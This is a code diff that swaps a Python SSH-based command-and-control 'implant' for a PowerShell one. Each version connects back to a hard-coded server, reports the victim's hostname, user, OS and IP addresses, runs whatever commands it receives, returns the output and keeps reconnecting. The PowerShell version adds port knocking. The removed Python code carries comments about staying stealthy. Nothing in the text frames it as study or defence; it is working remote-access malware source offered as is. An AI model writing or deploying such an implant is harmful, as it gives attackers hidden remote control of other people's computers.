@@ -1,224 +1,235 @@
-import paramiko
-import subprocess
-import os
-import sys
-import shlex
-import socket
-import getpass
-import time
-import logging
-import argparse
-import platform
-from typing import Optional, Dict, Any
+$ErrorActionPreference = "Stop"
 
-# Configure logging
-logging.basicConfig(
-    level=logging.ERROR,  # Set to ERROR to be stealthier, INFO for debugging
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[logging.StreamHandler()]
-)
-logger = logging.getLogger('C2Client')
+$Config = @{
+    ServerIP = "192.168.10.135"
+    ServerPort = 2222
+    Username = "implant"
+    Password = "implant"
+    KnockSequence = @(10000, 10001, 10002)
+    ReconnectDelay = 5
+    KeyExchangeTimeout = 10  # Seconds to wait for key exchange
+}
 
-
-class C2Client:
-    """C2 Client implementation using SSH for command and control"""
-    
-    def __init__(self, config: Dict[str, Any]):
-        self.config = config
-        self.ssh_client = None
-        self.session = None
-        self.reconnect_delay = 5  # seconds between reconnection attempts
-        self.system_info = self._gather_system_info()
-    
-    def _gather_system_info(self) -> Dict[str, str]:
-        """Gather basic system information"""
-        info = {
-            'hostname': socket.gethostname(),
-            'username': getpass.getuser(),
-            'platform': platform.system(),
-            'platform_version': platform.version(),
-            'architecture': platform.machine()
+function Perform-PortKnock {
+    param ([string]$ServerIP, [int[]]$Sequence)
+    try {
+        foreach ($port in $Sequence) {
+            Write-Host "[*] Knocking on port $port"
+            $client = New-Object System.Net.Sockets.TcpClient
+            $AsyncResult = $client.BeginConnect($ServerIP, $port, $null, $null)
+            $Wait = $AsyncResult.AsyncWaitHandle.WaitOne(1000)
+            $client.Close()
+            Start-Sleep -Milliseconds 500
         }
-        return info
-    
-    def connect(self) -> bool:
-        """Establish connection to the C2 server"""
-        try:
-            self.ssh_client = paramiko.SSHClient()
-            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            
-            logger.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
-            self.ssh_client.connect(
-                self.config['server_ip'], 
-                port=self.config['server_port'],
-                username=self.config['username'],
-                password=self.config['password'],
-                timeout=10
-            )
-            
-            self.session = self.ssh_client.get_transport().open_session()
-            if self.session.active:
-                # Send system information to server
-                client_info = f"Implant checked in from {self.system_info['hostname']} as {self.system_info['username']} ({self.system_info['platform']} {self.system_info['architecture']})"
-                self.session.send(client_info)
-                # Wait for acknowledgment
-                self.session.recv(1024)
-                logger.info("Successfully connected to C2 server")
-                return True
-            else:
-                logger.error("Failed to establish active session")
-                return False
-                
-        except Exception as e:
-            logger.error(f"Connection error: {e}")
-            return False
-    
-    def execute_command(self, command: str) -> str:
-        """Execute a command and return the output"""
-        try:
-            # Handle special commands
-            if command == "exit":
-                self.disconnect()
-                sys.exit(0)
-                
-            elif command.startswith("cd "):
-                # Change directory command
-                path = command[3:].strip()
-                try:
-                    os.chdir(path)
-                    return os.getcwd()
-                except Exception as e:
-                    return f"Error: {str(e)}"
-                    
-            elif command.startswith("download "):
-                # Placeholder for file download functionality
-                return "File download functionality not implemented yet"
-                
-            elif command.startswith("upload "):
-                # Placeholder for file upload functionality
-                return "File upload functionality not implemented yet"
-                
-            # Execute system command
-            output = subprocess.check_output(
-                shlex.split(command), 
-                stderr=subprocess.STDOUT,
-                shell=True,  # More secure to use False
-                timeout=30
-            )
-            return output.decode('utf-8', errors='replace')
-            
-        except subprocess.CalledProcessError as e:
-            return f"Command execution error: {e.output.decode('utf-8', errors='replace')}"
-        except subprocess.TimeoutExpired:
-            return "Command timed out after 30 seconds"
-        except Exception as e:
-            return f"Error: {str(e)}"
-    
-    def command_loop(self):
-        """Main command processing loop"""
-        while True:
-            try:
-                if not self.session or not self.session.active:
-                    logger.info("Session no longer active, attempting to reconnect")
-                    self.disconnect()
-                    time.sleep(self.reconnect_delay)
-                    if not self.connect():
-                        time.sleep(self.reconnect_delay)
-                        continue
-                
-                # Wait for command
-                command = self.session.recv(1024).decode().strip()
-                if not command:
-                    continue
-                    
-                logger.debug(f"Received command: {command}")
-                
-                # Execute command and send response
-                output = self.execute_command(command)
-                self.session.send(output)
-                
-            except KeyboardInterrupt:
-                logger.info("Keyboard interrupt received, exiting")
-                break
-            except Exception as e:
-                logger.error(f"Error in command loop: {e}")
-                time.sleep(self.reconnect_delay)
-                self.reconnect()
-    
-    def disconnect(self):
-        """Clean up and disconnect"""
-        if self.session:
-            try:
-                self.session.close()
-            except:
-                pass
+        Write-Host "[+] Knock sequence completed"
+        return $true
+    } catch {
+        Write-Warning "[-] Port knocking failed: $_"
+        return $false
+    }
+}
+
+function Get-SystemInfo {
+    try {
+        # Use Get-CimInstance instead of Get-WmiObject (which is deprecated in newer PowerShell)
+        $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
         
-        if self.ssh_client:
-            try:
-                self.ssh_client.close()
-            except:
-                pass
-            
-        self.session = None
-        self.ssh_client = None
-    
-    def reconnect(self):
-        """Handle reconnection logic"""
-        self.disconnect()
-        while not self.connect():
-            logger.info(f"Reconnection failed, retrying in {self.reconnect_delay} seconds")
-            time.sleep(self.reconnect_delay)
-            # Implement exponential backoff for stealth
-            self.reconnect_delay = min(300, self.reconnect_delay * 1.5)
-    
-    def run(self):
-        """Main entry point for client operation"""
-        try:
-            if self.connect():
-                self.command_loop()
-            else:
-                logger.error("Initial connection failed")
-        except Exception as e:
-            logger.error(f"Runtime error: {e}")
-        finally:
-            self.disconnect()
-
-
-def parse_arguments():
-    """Parse command line arguments"""
-    parser = argparse.ArgumentParser(description="C2 Client")
-    parser.add_argument("--server", default="192.168.10.135", help="C2 server address")
-    parser.add_argument("--port", type=int, default=2222, help="C2 server port")
-    parser.add_argument("--username", default="implant", help="Authentication username")
-    parser.add_argument("--password", default="implant", help="Authentication password")
-    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
-    return parser.parse_args()
-
-
-def main():
-    """Main entry point"""
-    # Parse arguments but don't show them in help output for stealth
-    try:
-        args = parse_arguments()
-        
-        # Configure logging level
-        if args.debug:
-            logger.setLevel(logging.DEBUG)
-        
-        config = {
-            'server_ip': args.server,
-            'server_port': args.port,
-            'username': args.username,
-            'password': args.password
+        # Fallback in case Get-CimInstance isn't available
+        if ($null -eq $osInfo) {
+            $osCaption = "Windows (version unknown)"
+        } else {
+            $osCaption = $osInfo.Caption
         }
         
-        client = C2Client(config)
-        client.run()
+        # Get IP addresses without using Get-NetIPAddress (for compatibility)
+        $networkAdapters = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | 
+            Where-Object { $_.OperationalStatus -eq 'Up' }
         
-    except Exception as e:
-        # Suppress error messages in production
-        logger.error(f"Error: {e}")
+        $ipAddresses = @()
+        foreach ($adapter in $networkAdapters) {
+            $properties = $adapter.GetIPProperties()
+            $addresses = $properties.UnicastAddresses | 
+                Where-Object { $_.Address.AddressFamily -eq 'InterNetwork' -and 
+                              $_.Address.ToString() -notmatch "^(127\.|169\.)" }
+            
+            if ($addresses) {
+                $ipAddresses += $addresses | ForEach-Object { $_.Address.ToString() }
+            }
+        }
+        
+        return @{
+            Hostname = [System.Net.Dns]::GetHostName()
+            Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+            OS = $osCaption
+            IP = $ipAddresses -join ','
+        }
+    } catch {
+        # Provide basic info if there's an error
+        return @{
+            Hostname = [System.Net.Dns]::GetHostName()
+            Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+            OS = "Error getting OS info"
+            IP = "Error getting IP info"
+        }
+    }
+}
 
+function Invoke-RemoteCommand {
+    param ([string]$Command)
+    try {
+        if ($Command -eq "exit") { return "Exiting..." }
+        if ($Command.StartsWith("cd ")) {
+            $newPath = $Command.Substring(3)
+            Set-Location $newPath
+            return "Changed directory to: $(Get-Location)"
+        }
+        
+        # Create a new process to execute the command
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "cmd.exe"
+        $psi.Arguments = "/c $Command"
+        $psi.RedirectStandardOutput = $true
+        $psi.RedirectStandardError = $true
+        $psi.UseShellExecute = $false
+        $psi.CreateNoWindow = $true
+        
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo = $psi
+        $process.Start() | Out-Null
+        
+        $output = $process.StandardOutput.ReadToEnd()
+        $error_output = $process.StandardError.ReadToEnd()
+        $process.WaitForExit()
+        
+        if ($error_output) {
+            return "Error: $error_output"
+        }
+        return $output -ne "" ? $output : "Command executed successfully (no output)"
+    } catch {
+        return "Error: $_"
+    }
+}
 
-if __name__ == '__main__':
-    main()
+function Connect-ToC2Server {
+    param ([hashtable]$Config)
+    try {
+        if (-not (Perform-PortKnock -ServerIP $Config.ServerIP -Sequence $Config.KnockSequence)) {
+            throw "Port knocking failed"
+        }
+
+        Write-Host "[*] Setting up TCP connection to $($Config.ServerIP):$($Config.ServerPort)..."
+        $client = New-Object System.Net.Sockets.TcpClient
+        
+        # Connect with timeout
+        $connectResult = $client.BeginConnect($Config.ServerIP, $Config.ServerPort, $null, $null)
+        $success = $connectResult.AsyncWaitHandle.WaitOne([TimeSpan]::FromSeconds(10))
+        
+        if (-not $success) {
+            $client.Close()
+            throw "Connection timed out"
+        }
+        
+        try {
+            $client.EndConnect($connectResult)
+        } catch {
+            throw "Failed to establish connection: $_"
+        }
+        
+        if (-not $client.Connected) {
+            throw "TCP Connection failed"
+        }
+        
+        $stream = $client.GetStream()
+        Write-Host "[+] Connected successfully"
+        
+        # Set up streams for communication
+        $streamReader = New-Object System.IO.StreamReader($stream)
+        $streamWriter = New-Object System.IO.StreamWriter($stream)
+        $streamWriter.AutoFlush = $true
+        
+        # Send system info as identification
+        $sysInfo = Get-SystemInfo
+        $infoJson = ConvertTo-Json -InputObject $sysInfo -Compress
+        $streamWriter.WriteLine("IMPLANT:$infoJson")
+        
+        return @{ 
+            Client = $client
+            Stream = $stream
+            Reader = $streamReader
+            Writer = $streamWriter
+        }
+    } catch {
+        Write-Warning "[-] Connection error: $_"
+        return $null
+    }
+}
+
+function Start-ImplantLoop {
+    param ([hashtable]$Config)
+    
+    while ($true) {
+        $connection = Connect-ToC2Server -Config $Config
+        
+        if ($null -eq $connection) {
+            Write-Host "[-] Failed to connect. Retrying in $($Config.ReconnectDelay)s."
+            Start-Sleep -Seconds $Config.ReconnectDelay
+            $Config.ReconnectDelay = [Math]::Min(300, $Config.ReconnectDelay * 1.5)
+            continue
+        }
+        
+        try {
+            $client = $connection.Client
+            $reader = $connection.Reader
+            $writer = $connection.Writer
+            
+            # Reset reconnect delay on successful connection
+            $Config.ReconnectDelay = 5
+            
+            Write-Host "[*] Waiting for commands..."
+            
+            while ($client.Connected) {
+                # Check if there are bytes to read
+                if ($client.Available -gt 0 -or $reader.Peek() -ne -1) {
+                    $command = $reader.ReadLine()
+                    
+                    if ($command) {
+                        Write-Host "[*] Command received: $command"
+                        $output = Invoke-RemoteCommand -Command $command
+                        
+                        # Send the output back, with a special marker to indicate end of output
+                        $writer.WriteLine($output)
+                        $writer.WriteLine("CMD_OUTPUT_END")
+                    }
+                }
+                
+                # Simple heartbeat check - send empty packet every 60 seconds
+                if ((Get-Date).Second -eq 0 -and (Get-Date).Millisecond -lt 200) {
+                    $writer.WriteLine("HEARTBEAT")
+                    Start-Sleep -Milliseconds 200  # Avoid multiple heartbeats
+                }
+                
+                Start-Sleep -Milliseconds 100
+            }
+        } catch {
+            Write-Warning "[-] Connection error: $_"
+        } finally {
+            # Clean up resources
+            if ($null -ne $connection.Reader) { $connection.Reader.Close() }
+            if ($null -ne $connection.Writer) { $connection.Writer.Close() }
+            if ($null -ne $connection.Stream) { $connection.Stream.Close() }
+            if ($null -ne $connection.Client) { $connection.Client.Close() }
+        }
+        
+        Write-Host "[-] Connection lost. Reconnecting in $($Config.ReconnectDelay)s..."
+        Start-Sleep -Seconds $Config.ReconnectDelay
+    }
+}
+
+# Main execution
+try {
+    Write-Host "[*] Implant starting..."
+    # No need for SSH.NET library - using standard .NET TCP functionality
+    Start-ImplantLoop -Config $Config
+} catch {
+    Write-Error "[X] Critical error: $_"
+}
